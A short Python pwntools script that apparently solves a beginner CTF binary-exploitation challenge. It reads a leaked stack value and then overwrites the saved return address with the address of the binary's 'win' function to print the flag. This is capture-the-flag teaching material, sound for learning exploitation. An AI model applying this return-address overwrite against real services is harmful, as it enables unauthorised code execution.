#!/usr/bin/env python3
from pwn import *
import os

HOST = os.getenv('CTF4B_HOST', '0.0.0.0')
PORT = int(os.getenv('CTF4B_PORT', '4103'))

context.log_level = 'critical'
binfile = './chall'
e = ELF(binfile)
context.binary = binfile

io = remote(HOST, PORT)

io.recvuntil(b'saved rbp\n')
saved_ret_addr = io.readline().decode('utf-8', 'ignore').split()[0]
io.sendlineafter('>', saved_ret_addr)

io.sendlineafter('=', str(e.sym['win']))

# skip stack view
for _ in range(14):
    io.readline()

print(io.readline().decode('utf-8', 'ignore'), end='')

io.close()
exit()
